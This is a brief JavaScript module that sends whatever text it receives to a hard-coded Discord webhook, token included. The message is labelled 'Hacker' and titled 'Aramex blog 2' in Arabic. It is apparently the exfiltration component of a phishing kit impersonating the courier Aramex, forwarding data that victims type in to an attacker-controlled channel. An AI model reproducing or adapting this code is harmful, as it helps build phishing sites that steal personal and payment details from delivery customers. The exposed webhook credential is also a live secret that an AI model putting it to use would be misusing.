import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322838803991494676/absRH3uWiGI36_3fRcQ0LD7NpBEM9ktGe1imBgwUDsTQ_k25fIqSlWKytf9XphKvZbcp",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
